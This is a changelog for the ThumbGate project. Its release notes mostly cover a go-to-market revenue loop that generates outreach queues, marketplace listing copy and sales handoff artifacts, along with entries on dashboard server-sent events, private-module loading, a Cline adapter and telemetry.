- [#1396](https://github.com/IgorGanapolsky/ThumbGate/pull/1396) [`e7b993f`](https://github.com/IgorGanapolsky/ThumbGate/commit/e7b993f0c5ea3f79ee9a8a8aa916caa3363eb091) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a queue-backed LinkedIn workflow hardening pack to the GTM revenue loop, including tracked founder-post, comment, DM, and self-serve follow-on assets.

- [#1467](https://github.com/IgorGanapolsky/ThumbGate/pull/1467) [`cb884a4`](https://github.com/IgorGanapolsky/ThumbGate/commit/cb884a4b1206e08401b86d15ae5adb399058d196) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add machine-readable landing-page buyer paths for the install guide, Pro checkout, and Workflow Hardening Sprint so search parsers and operators can route buyers to the right conversion path.

- [#1431](https://github.com/IgorGanapolsky/ThumbGate/pull/1431) [`bc72c63`](https://github.com/IgorGanapolsky/ThumbGate/commit/bc72c6314b2653557f1d99d302d31bccbec13a6d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Refresh the GTM marketplace generator so the operator pack always surfaces an evidence-backed self-serve tooling lane alongside warm workflow-hardening targets, and keep the generated marketplace copy, handoff notes, and sample targets aligned with that mixed acquisition motion.

- [#1461](https://github.com/IgorGanapolsky/ThumbGate/pull/1461) [`55c2002`](https://github.com/IgorGanapolsky/ThumbGate/commit/55c200251489cb8e2c5fc3337488d86b96f5d1d3) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add evidence-backed marketplace listing variants to the GTM revenue loop, regenerate the operator queue artifacts, and keep the marketplace copy pack aligned to proof-backed sprint versus guide-to-Pro motions.

- [#1428](https://github.com/IgorGanapolsky/ThumbGate/pull/1428) [`d0577b6`](https://github.com/IgorGanapolsky/ThumbGate/commit/d0577b6fbda73a9d74b1966973da7c317ef79570) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add an operator-ready MCP directory repair pack that captures live ThumbGate vs legacy listing drift, wire it into the autonomous sales loop, and keep the discovery sprint artifact list plus workflow test coverage in sync.

- [#1475](https://github.com/IgorGanapolsky/ThumbGate/pull/1475) [`b3edbe8`](https://github.com/IgorGanapolsky/ThumbGate/commit/b3edbe83d2a4bab2abd14a43dfdacc3b2ea63b8d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Track MCP directory follow-on offers with machine-readable UTM attribution and add a dedicated ThumbGate Pro CTA so self-serve paid intent is measurable alongside the guide and workflow sprint motions.

- [#1446](https://github.com/IgorGanapolsky/ThumbGate/pull/1446) [`5bcaf85`](https://github.com/IgorGanapolsky/ThumbGate/commit/5bcaf856e0088ab69500fa6830cee842d6335bdb) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Align the public FAQ and GTM revenue-loop assets around the current Pro versus Workflow Hardening Sprint offer split so operator copy stays consistent across discovery and conversion surfaces.

- [#1394](https://github.com/IgorGanapolsky/ThumbGate/pull/1394) [`b9abbc6`](https://github.com/IgorGanapolsky/ThumbGate/commit/b9abbc6e545318c91ddcce3f377ec7428e54cf28) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a machine-readable `operator-priority-handoff.json` revenue-loop artifact so operators and automations can consume the ranked outreach queue, CTA, proof rules, and sales pipeline commands without scraping markdown.

- [#1399](https://github.com/IgorGanapolsky/ThumbGate/pull/1399) [`3493fa7`](https://github.com/IgorGanapolsky/ThumbGate/commit/3493fa7fb010d5aee1e898bb11e87068baf40436) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Keep operator handoff markdown aligned with the GTM revenue-loop JSON summary by preserving summary contact surfaces and why-now fields during rendering.

- [#1436](https://github.com/IgorGanapolsky/ThumbGate/pull/1436) [`bbdc183`](https://github.com/IgorGanapolsky/ThumbGate/commit/bbdc183c77500306177363d3059b5c7f08444b9b) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Persist the GTM operator pack sidecar JSON and CSV artifacts in `docs/marketing` when the revenue loop writes checked-in docs, so the machine-readable queues and listing metadata stay aligned with the published Markdown packs.

- [#1408](https://github.com/IgorGanapolsky/ThumbGate/pull/1408) [`d002036`](https://github.com/IgorGanapolsky/ThumbGate/commit/d0020368cb4ca35add78d2a35ee1f47aad51145c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Split self-serve Pro prospects out of the generic operator cold queue so GTM handoff assets preserve the selected motion and make self-serve closes explicit.

- [#1463](https://github.com/IgorGanapolsky/ThumbGate/pull/1463) [`c593d66`](https://github.com/IgorGanapolsky/ThumbGate/commit/c593d6679d5b5e92321b7a0cfc986870f3019466) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a flattened operator send-now CSV and JSON export to the GTM revenue loop so operators can batch outreach and sales-pipeline updates without reformatting the ranked handoff output.

- [#1418](https://github.com/IgorGanapolsky/ThumbGate/pull/1418) [`eb53f67`](https://github.com/IgorGanapolsky/ThumbGate/commit/eb53f6705012975b0c1fa23bd6976ef146858155) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Refresh the outreach handoff generator so self-serve Pro prospects render in their own operator lane instead of being mixed into the generic cold GitHub queue.

- [#1371](https://github.com/IgorGanapolsky/ThumbGate/pull/1371) [`80f0c2f`](https://github.com/IgorGanapolsky/ThumbGate/commit/80f0c2fdebc788001cf86727167bcce7d50bbbc9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Prioritize active revenue follow-ups in the GTM loop, suppress terminal leads from operator queues, and refresh the evidence-backed outreach bundle.

- [#1473](https://github.com/IgorGanapolsky/ThumbGate/pull/1473) [`8c0f2a9`](https://github.com/IgorGanapolsky/ThumbGate/commit/8c0f2a97ac1951dc31ea78f12e399db2da0c992f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Surface production-rollout buyers as a first-class GTM queue lane and regenerate the operator handoff, send-now export, and marketplace copy from the live evidence-backed revenue loop.

- [#1375](https://github.com/IgorGanapolsky/ThumbGate/pull/1375) [`ffd08ea`](https://github.com/IgorGanapolsky/ThumbGate/commit/ffd08eaa5111c42c4c78279419d7e1a1cb9aeb93) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Keep public dashboard and numbers surfaces proof-safe by removing fabricated demo revenue copy, refreshing the generated numbers snapshot wording, and pinning both behaviors with regression tests.

- [#1410](https://github.com/IgorGanapolsky/ThumbGate/pull/1410) [`546531c`](https://github.com/IgorGanapolsky/ThumbGate/commit/546531cffc8630cc414ab8122185d0ad5b7be7a7) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Export pipeline lead ids, next-operator actions, and ready-to-run sales stage commands in the GTM target queue CSV so operators can execute outreach and stage advances directly from the flat queue artifact.

- [#1369](https://github.com/IgorGanapolsky/ThumbGate/pull/1369) [`15d37db`](https://github.com/IgorGanapolsky/ThumbGate/commit/15d37db42304346cd4d1147467e52f834d20b7f3) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Keep README buyer CTAs on live ThumbGate surfaces so checkout, dashboard, and guide links preserve the intended path and UTM attribution.

- [#1426](https://github.com/IgorGanapolsky/ThumbGate/pull/1426) [`ce17de0`](https://github.com/IgorGanapolsky/ThumbGate/commit/ce17de00cee978b12fa2185bf921c7d67fdd6fa6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add an evidence-backed Reddit DM workflow hardening pack to the autonomous revenue loop so warm Reddit leads ship with tracked operator queues, proof-timed follow-ups, and copy-paste close drafts.

- [#1453](https://github.com/IgorGanapolsky/ThumbGate/pull/1453) [`9eaeb3b`](https://github.com/IgorGanapolsky/ThumbGate/commit/9eaeb3b4db00ce0696308c799457e838a1d57861) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Refresh the checked-in GTM revenue-loop assets from the latest hosted billing snapshot and live GitHub discovery so operator handoff copy, marketplace listing themes, and target queues stay aligned with current buyer signals.

- [#1403](https://github.com/IgorGanapolsky/ThumbGate/pull/1403) [`f0871f5`](https://github.com/IgorGanapolsky/ThumbGate/commit/f0871f5af4b1f7b4de3e27b8a3c22975a6424047) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Diversify the GTM revenue loop so operator assets surface both workflow-hardening targets and self-serve tooling prospects, route Pro-oriented first touch through the proof-backed setup guide, and keep generated sales-command notes aligned with the selected motion.

- [#1433](https://github.com/IgorGanapolsky/ThumbGate/pull/1433) [`ed8460a`](https://github.com/IgorGanapolsky/ThumbGate/commit/ed8460ae8e3c4426f2c4670babf16e4daafbd7b9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Stabilize the hosted GTM revenue loop by retrying transient hosted-summary fallbacks, selecting the freshest hosted billing window with real commercial signal, and regenerating the operator outreach assets from that verified state.

- [#1385](https://github.com/IgorGanapolsky/ThumbGate/pull/1385) [`0c2f70d`](https://github.com/IgorGanapolsky/ThumbGate/commit/0c2f70d20c680bccb817a85489c0bf5aa9ac8e47) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Keep GTM revenue-loop marketplace assets evidence-backed by tightening the post-revenue headline language and preserving canonical sprint and Pro CTAs after rebases.

- [#1459](https://github.com/IgorGanapolsky/ThumbGate/pull/1459) [`db9557b`](https://github.com/IgorGanapolsky/ThumbGate/commit/db9557babb5f249e680c261b115565e5757bb348) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Refresh the evidence-backed GTM revenue queue and sanitize generated sales-command notes so operator artifacts do not leak outreach-instruction phrasing.

- [#1363](https://github.com/IgorGanapolsky/ThumbGate/pull/1363) [`a978550`](https://github.com/IgorGanapolsky/ThumbGate/commit/a9785500d5adea8244d08d5aa2dc6c6d8efdf5bf) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Refresh the autonomous GTM revenue-loop prospecting queries and regenerate the operator sales asset bundle with direct owner contact surfaces.

- [#1406](https://github.com/IgorGanapolsky/ThumbGate/pull/1406) [`d397402`](https://github.com/IgorGanapolsky/ThumbGate/commit/d3974021ac580ede844279917c59827de5093fa9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Extend the GTM revenue loop with self-serve tool-path follow-ups, checkout-close drafts, and paid-stage sales commands so operator handoff artifacts carry proof-backed conversion copy from first touch through purchase.

- [#1471](https://github.com/IgorGanapolsky/ThumbGate/pull/1471) [`702a3da`](https://github.com/IgorGanapolsky/ThumbGate/commit/702a3da1cbb816a3bd26181564d3e29da27d326d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Widen the autonomous GTM revenue queue toward stronger self-serve plugin and hook targets, and refresh the operator handoff assets around those evidence-backed prospects.

- [#1424](https://github.com/IgorGanapolsky/ThumbGate/pull/1424) [`daed1ab`](https://github.com/IgorGanapolsky/ThumbGate/commit/daed1abe016c92537efb02e6b72956757b4364c6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Keep the Claude, Gemini CLI, LinkedIn, and ChatGPT sales packs aligned with the live GTM revenue loop so operator copy stays cold-start truthful and the generated docs stop implying verified revenue before it exists.

- [#1561](https://github.com/IgorGanapolsky/ThumbGate/pull/1561) [`c56b223`](https://github.com/IgorGanapolsky/ThumbGate/commit/c56b223171d9879edc868e9373fb3cfd16d0334a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Make the Team workflow sprint intake visible on the landing page, add first-party telemetry for Team intake starts and submit attempts, and upgrade `@anthropic-ai/sdk` to a non-vulnerable version.

## 1.16.8

### Patch Changes

- [#1346](https://github.com/IgorGanapolsky/ThumbGate/pull/1346) [`7ac5e9b`](https://github.com/IgorGanapolsky/ThumbGate/commit/7ac5e9beeca8c1fba98e785f22cdcd0d225f28d0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Clean first-touch GTM outreach drafts so cold outreach stays buyer-facing, removes internal strategy leakage, and keeps generated operator sales assets aligned with evidence-backed messaging.

## 1.16.7

### Patch Changes

- [#1338](https://github.com/IgorGanapolsky/ThumbGate/pull/1338) [`bfd8901`](https://github.com/IgorGanapolsky/ThumbGate/commit/bfd89011d2647639ee9d659476fab984a12783f0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a ranked revenue operator handoff artifact to the GTM revenue loop so warm outreach, cold GitHub targets, proof rules, and sales-ledger import steps stay synchronized.

## 1.16.6

### Patch Changes

- [#1336](https://github.com/IgorGanapolsky/ThumbGate/pull/1336) [`e643a65`](https://github.com/IgorGanapolsky/ThumbGate/commit/e643a65897c36895c9ff30fa370989658913452a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Generate the warm outreach handoff directly from the GTM revenue loop so the shipped sales assets, prospect queue, marketplace copy, and operator outreach drafts stay evidence-backed and synchronized.

## 1.16.5

### Patch Changes

- [#1322](https://github.com/IgorGanapolsky/ThumbGate/pull/1322) [`5e375d2`](https://github.com/IgorGanapolsky/ThumbGate/commit/5e375d20f69accfd11a04ff5dd573d0c5b904a1b) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Restore the autonomous sales agent's Codex revenue-pack emission so GTM runs ship Codex listing copy, operator queue rows, and proof-linked follow-on assets alongside the Claude, Cursor, and Gemini packs.

- [#1325](https://github.com/IgorGanapolsky/ThumbGate/pull/1325) [`22dc6e0`](https://github.com/IgorGanapolsky/ThumbGate/commit/22dc6e09731ac3dfebcdbce865c8a39ec3b58930) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Emit a ChatGPT GPT revenue pack from the GTM automation so ThumbGate ships evidence-backed GPT discovery surfaces, builder-repair assets, tracked follow-on offers, and operator queue rows alongside the Claude, Cursor, Gemini, and Codex packs.

- [#1311](https://github.com/IgorGanapolsky/ThumbGate/pull/1311) [`4e71af4`](https://github.com/IgorGanapolsky/ThumbGate/commit/4e71af451943eab31dfab79e56d498db490c8ce0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a Claude workflow hardening pack to the GTM automation so each revenue-loop run emits operator-ready Claude-first outbound copy, buyer lanes, and proof-linked follow-up guidance.

- [#1318](https://github.com/IgorGanapolsky/ThumbGate/pull/1318) [`910515f`](https://github.com/IgorGanapolsky/ThumbGate/commit/910515fe590f69239d9c2688d61adf35d5c5282e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Emit a Codex operator revenue pack from the GTM automation so the repo ships evidence-backed listing copy, operator prospect queues, outreach drafts, and proof-first follow-on CTAs for the Codex install surface.

- [#1317](https://github.com/IgorGanapolsky/ThumbGate/pull/1317) [`39aaaf7`](https://github.com/IgorGanapolsky/ThumbGate/commit/39aaaf73f552e58f466fe546f43984841c605989) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a Codex plugin revenue pack with proof-backed install, guide, and bundle sales assets.

- [#1307](https://github.com/IgorGanapolsky/ThumbGate/pull/1307) [`2af4acb`](https://github.com/IgorGanapolsky/ThumbGate/commit/2af4acbc65b7e7fd4b80473b9bc93e65fa64ee4f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Emit a Cursor marketplace revenue pack from the GTM automation so the repo ships operator-ready Marketplace, Directory, and Team Marketplace copy with tracked follow-on offers and proof links.

- [#1308](https://github.com/IgorGanapolsky/ThumbGate/pull/1308) [`69c2c71`](https://github.com/IgorGanapolsky/ThumbGate/commit/69c2c712dc1cb9fb72c022d797dd0ddd8ad8538a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Keep GTM revenue-loop assets tied to explicit proof links and claim guardrails.

- [#1320](https://github.com/IgorGanapolsky/ThumbGate/pull/1320) [`e58be96`](https://github.com/IgorGanapolsky/ThumbGate/commit/e58be9637e233f822797992ef8e7fd4ae8aa087e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Emit a Gemini CLI demand pack from the GTM automation so the repo ships evidence-backed Gemini guide surfaces, operator queue rows, outreach drafts, and corrected Gemini install copy.

- [#1328](https://github.com/IgorGanapolsky/ThumbGate/pull/1328) [`8261d36`](https://github.com/IgorGanapolsky/ThumbGate/commit/8261d361f22955391bada3f61f593fb2ce3eb5e1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Write GTM revenue loop docs into dedicated `docs/marketing` artifacts instead of overwriting the GitOps guide, and ship the generated marketplace copy and target-queue outputs with the repo.

- [#1313](https://github.com/IgorGanapolsky/ThumbGate/pull/1313) [`688796c`](https://github.com/IgorGanapolsky/ThumbGate/commit/688796cc99dea39ac342b00faf06680645d3e127) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a proof-backed conversion path to the public guide so operators can move from free install education into Pro or Workflow Hardening Sprint next steps with linked Commercial Truth and verification evidence.

- [#1315](https://github.com/IgorGanapolsky/ThumbGate/pull/1315) [`394253c`](https://github.com/IgorGanapolsky/ThumbGate/commit/394253cc364ea145070ef3dfe7b1ffc287b43056) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Route install-intent marketplace and Claude operator surfaces through the proof-backed guide so listing traffic lands on the setup path that already carries Commercial Truth, verification evidence, and clear Pro versus Workflow Hardening Sprint next steps.

- [#1324](https://github.com/IgorGanapolsky/ThumbGate/pull/1324) [`4294a5a`](https://github.com/IgorGanapolsky/ThumbGate/commit/4294a5af68b96f0b39ec037be9fca3513e563b59) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Refresh the Claude workflow hardening pack with verified install surfaces, tracked listing copy, and a live prospect queue.

- [#1332](https://github.com/IgorGanapolsky/ThumbGate/pull/1332) [`ae27b84`](https://github.com/IgorGanapolsky/ThumbGate/commit/ae27b84f55314e767e82bb4e8cea874697985b4b) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Extend the Claude workflow hardening pack with active-channel acquisition drafts so each revenue pass ships evidence-backed Reddit, LinkedIn, Threads, and Bluesky copy tied to live Claude install surfaces and proof-timing guardrails.

## 1.16.4

### Patch Changes

- [#1300](https://github.com/IgorGanapolsky/ThumbGate/pull/1300) [`f98e175`](https://github.com/IgorGanapolsky/ThumbGate/commit/f98e175fe0fdad2f4178bba0eda596b44e0f3a01) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix warm revenue-loop follow-up drafts so operator outreach falls back to workflow language when a qualified target has no repository name.

- [#1266](https://github.com/IgorGanapolsky/ThumbGate/pull/1266) [`2291476`](https://github.com/IgorGanapolsky/ThumbGate/commit/22914765bc5ed5531b1d0dd2efc304c54ccf4b48) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add machine-speed ROI surfaces to ThumbGate's public shell. The dashboard now exposes actionable remediations and agent surface inventory, the PreToolUse reminder adds action-profile and safer-next-move context, and the landing/meta copy is aligned to position ThumbGate as pre-action defense for AI coding agents without hardcoded token-savings claims.

- [#1302](https://github.com/IgorGanapolsky/ThumbGate/pull/1302) [`18c22cd`](https://github.com/IgorGanapolsky/ThumbGate/commit/18c22cd7a7947553fffbc537c297fc02a1ed1819) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Emit marketplace copy pack markdown and JSON from the GTM revenue loop so launch surfaces stay aligned with current buyer signals.

- [#1298](https://github.com/IgorGanapolsky/ThumbGate/pull/1298) [`46636b0`](https://github.com/IgorGanapolsky/ThumbGate/commit/46636b01217ffacac70f9466672455b4b04835ef) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Filter corrupted GitHub repository descriptions out of the GTM revenue prospect queue so outreach drafts stay evidence-backed.

- [#1293](https://github.com/IgorGanapolsky/ThumbGate/pull/1293) [`325f274`](https://github.com/IgorGanapolsky/ThumbGate/commit/325f274de9625894e2be49939d76f00e2f7c72f6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a warm discovery revenue queue, preserve lead source metadata through sales imports, and align Reddit outreach copy with the workflow hardening sprint offer.

## 1.16.3

### Patch Changes

- [#1290](https://github.com/IgorGanapolsky/ThumbGate/pull/1290) [`f54046a`](https://github.com/IgorGanapolsky/ThumbGate/commit/f54046a236d03b60839d01b0147b9bd5e497baca) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add evidence-backed GTM handoff outputs so the revenue loop emits first-touch drafts, pain-confirmed follow-ups, proof-timing guidance, and JSONL prospect queues for operator outreach.

## 1.16.2

### Patch Changes

- [#1288](https://github.com/IgorGanapolsky/ThumbGate/pull/1288) [`7fb0caf`](https://github.com/IgorGanapolsky/ThumbGate/commit/7fb0caf4e362de6b44aa0bb0056e0a29dd79f4b8) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add tracked Aiventyx marketplace CTAs and operator-ready listing export assets.

- [#1284](https://github.com/IgorGanapolsky/ThumbGate/pull/1284) [`fdf1933`](https://github.com/IgorGanapolsky/ThumbGate/commit/fdf19337238408f99e01d10081cb9e0e60c1bd83) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Harden the GTM revenue loop with evidence-based target scoring, operator-ready CSV prospect queues, and a discovery-first launch checklist that prioritizes validated outreach over stale broadcast playbooks.

## 1.16.1

### Patch Changes

- [#1282](https://github.com/IgorGanapolsky/ThumbGate/pull/1282) [`ae0587c`](https://github.com/IgorGanapolsky/ThumbGate/commit/ae0587c0c1e0dcdd929e648ccfe81b4a4085937f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add an Aiventyx marketplace revenue lane with Free, Pro, and Teams listing payloads, a 90-day paid-conversion plan, and generator coverage for repeatable operator artifacts.

- [#1276](https://github.com/IgorGanapolsky/ThumbGate/pull/1276) [`6c66dab`](https://github.com/IgorGanapolsky/ThumbGate/commit/6c66dabc572a2ff2273c4dd3bbed256890b79f89) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add provider-native action normalization for Anthropic tool use, OpenAI tool calls, and MCP tools/resources/prompts payloads, including token/cost budget enforcement before workflow execution.

## 1.16.0

### Minor Changes

- [#1122](https://github.com/IgorGanapolsky/ThumbGate/pull/1122) [`de61abe`](https://github.com/IgorGanapolsky/ThumbGate/commit/de61abe37bb58d217aad7299f3b5cb8e411d1a09) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(feedback-stats): emit structured `actionableRemediations` alongside prose `recommendations`

  `analyzeFeedback()` / `feedback_stats` now returns a machine-actionable `actionableRemediations` array parallel to the existing prose `recommendations` list. Each entry has:

  ```ts
  {
    type: 'skill-improve' | 'pattern-reuse' | 'trend-declining' | 'trend-degrading' | 'high-risk-domain' | 'high-risk-tag' | 'delegation-reduce' | 'delegation-policy-review' | 'diagnose-failure-category',
    target: string,         // skill name, tag, domain, or failure category
    evidence: { ... },      // numeric signal (counts, rates) that triggered the rule
    action: string,         // canonical action verb consumers can switch on
    rationale: string,      // human-readable explanation of why this fired
  }
  ```

  This lets hooks and agents act on recommendations programmatically without regex-parsing prose strings. Prose output is unchanged and fully backwards-compatible; the new field is always present (empty array when no recommendations fire).

- [#1198](https://github.com/IgorGanapolsky/ThumbGate/pull/1198) [`17ec44b`](https://github.com/IgorGanapolsky/ThumbGate/commit/17ec44bbbce24b18c371c9a1789eabf283e51677) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(adapters): Cline adapter for Roo Code sunset capture

  Adds a first-class Cline adapter (`adapters/cline/.mcp.json`, `.clinerules`, `INSTALL.md`) and wires `npx thumbgate init --agent cline` to auto-register the ThumbGate MCP server in Cline's VS Code globalStorage settings and drop `.clinerules` into the project root. Updates README, landing page, and compare page to list Cline alongside Claude Code, Cursor, Codex, Gemini CLI, Amp, and OpenCode. Captures migration audience from Roo Code's announced 2026-05-15 shutdown.

- [#1161](https://github.com/IgorGanapolsky/ThumbGate/pull/1161) [`a46785c`](https://github.com/IgorGanapolsky/ThumbGate/commit/a46785cac7343210348c46b021f2457c148a2bdc) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Surface per-slug `/go/:slug` hits, checkout starts, and conversion rate on the
  dashboard telemetry feed. `getTelemetryAnalytics` now exposes a `trackedLinks`
  panel (`totalHits`, `totalCheckoutStarts`, `overallConversionRate`,
  `bySlug.<slug>.{hits,checkoutStarts,conversionRate}`, `topSlug`) so the
  `/v1/dashboard` API and `/dashboard` UI can show which tracked links actually
  drive checkouts. CLI telemetry is excluded from the rollup (web-only).

- [#1264](https://github.com/IgorGanapolsky/ThumbGate/pull/1264) [`d631ddd`](https://github.com/IgorGanapolsky/ThumbGate/commit/d631ddde9b93490a2c25164b56f1ca51731514b4) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(api): push dashboard updates over Server-Sent Events on `/v1/events`

  Applies the "persistent channel beats per-turn HTTP round trip" pattern (the thesis of OpenAI's 2026-04 Responses-API WebSocket post) to the ThumbGate dashboard. Instead of re-fetching `/v1/feedback/stats` on a manual refresh, clients now subscribe once to `/v1/events` and receive pushed frames as feedback/rule-regen events happen.

  Surface:

  - **`GET /v1/events`** — Bearer-authed SSE stream. On connect the server emits an `event: connected` frame with the current server version; thereafter every `POST /v1/feedback/capture` emits an `event: feedback` frame (signal + tags + feedbackId + promoted) and every `POST /v1/feedback/rules` emits an `event: rules-updated` frame (path). Heartbeat comment frames every 25s keep Railway / proxy idle timers from closing the connection.
  - **Dashboard client** (`public/dashboard.html`) — subscribes immediately after `connect()` using `fetch()` + `ReadableStream` (needed instead of native `EventSource` so we can send `Authorization: Bearer …`). On any event the client re-pulls `/v1/feedback/stats` and re-renders the summary cards.

  Non-breaking: existing polled `/v1/feedback/stats`, `/v1/dashboard`, and `/v1/feedback/rules` endpoints are unchanged. Clients that don't open `/v1/events` behave exactly as before.

  Why: manual refresh was the only way to see new feedback land in the dashboard, which made live demo sessions awkward and hid the real-time nature of the feedback loop. SSE is the right tool for server→client pushes here — no WebSocket upgrade dance, no extra deps, survives Railway's proxy with `X-Accel-Buffering: no`.

- [#1269](https://github.com/IgorGanapolsky/ThumbGate/pull/1269) [`5ce97bf`](https://github.com/IgorGanapolsky/ThumbGate/commit/5ce97bf96509ddf736b824d56a7830330fe4b647) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(newsletter): send welcome email via Resend on subscription

  New subscribers to the ThumbGate newsletter now receive an immediate welcome email with the "one AI mistake prevented per email" framing and a CTA to thumbgate.ai/pro.

  The `/api/newsletter` endpoint fires the send in the background (Promise-then pattern) so the HTTP response stays fast and never fails on mailer errors. Missing RESEND_API_KEY degrades gracefully to a logged warning; the subscriber is still recorded.

### Patch Changes

- [#1140](https://github.com/IgorGanapolsky/ThumbGate/pull/1140) [`d675466`](https://github.com/IgorGanapolsky/ThumbGate/commit/d675466984975297f4ba8000289b3e2e961537e6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add Anthropic-aligned prompt caching and JSON response handling to the
  public ThumbGate shell, and persist prompt evaluation evidence in CI so
  regressions are easier to catch before release.

- [#1153](https://github.com/IgorGanapolsky/ThumbGate/pull/1153) [`b9d7f2c`](https://github.com/IgorGanapolsky/ThumbGate/commit/b9d7f2c5d39493f550b8a9926fd52d41d5038cd6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(api): lazy-load commercial offer private boundary

  Move the commercial-offer helpers used by the hosted billing checkout
  path behind the private API module loader. The hosted runtime keeps the
  same behavior when the module exists, while partially extracted or
  public-shell deployments now fail with the standard
  `PRIVATE_CORE_REQUIRED` contract instead of assuming commercial offer
  logic is always bundled.

  This pins the current split at the checkout boundary:

  1. checkout attribution parsing now resolves plan/cycle/seat helpers
     through the private API module loader.
  2. checkout offer summaries now resolve pricing constants through the
     private API module loader.
  3. API regression coverage asserts that `/v1/billing/checkout` returns
     503 when the commercial-offer module is absent.

- [#1153](https://github.com/IgorGanapolsky/ThumbGate/pull/1153) [`b9d7f2c`](https://github.com/IgorGanapolsky/ThumbGate/commit/b9d7f2c5d39493f550b8a9926fd52d41d5038cd6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(api): lazy-load lesson search and semantic private boundaries

  Move the remaining lesson-search and semantic-schema routes in the HTTP
  API server behind the private API module loader. The hosted runtime keeps
  the current behavior when those modules are present, while public-shell
  or partially extracted runtimes now fail with the standard
  `PRIVATE_CORE_REQUIRED` 503 instead of assuming the modules are always
  bundled.

  This pins two more hosted-only edges:

  1. `/v1/lessons/search` now resolves through the lesson-search private
     boundary.
  2. `/v1/semantic/describe` now resolves through the semantic-layer
     private boundary.
  3. API regression tests cover both the normal route behavior and the
     unavailable-module fallback contract.

- [#1153](https://github.com/IgorGanapolsky/ThumbGate/pull/1153) [`b9d7f2c`](https://github.com/IgorGanapolsky/ThumbGate/commit/b9d7f2c5d39493f550b8a9926fd52d41d5038cd6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(api): lazy-load lesson synthesis private boundary

  Move lesson record read/write flows behind the private API loader so export, import, and lesson detail mutations fail with the standard private-core contract when the hosted lesson synthesis module is unavailable.

- [#1130](https://github.com/IgorGanapolsky/ThumbGate/pull/1130) [`5dcc446`](https://github.com/IgorGanapolsky/ThumbGate/commit/5dcc44656169dafef40538502103415adb00ca3c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - chore(brand): canonical TG monogram on README + Stripe coherence

  The canonical ThumbGate mark (TG gate monogram, dark rounded square with
  teal-to-cyan gradient frame) now renders consistently across the three
  public brand surfaces. Before this change each surface had drifted to
  its own raster:

  - Landing page (thumbgate.ai): already canonical (header + favicon + og.png)
  - Stripe product catalog: ThumbGate Pro and ThumbGate Team each had a
    different one-off upload (teal shield / dark gate-with-lightning).
    Re-pointed at `https://thumbgate.ai/assets/brand/thumbgate-icon-512.png`
    via the Stripe API so the checkout surface matches the landing page
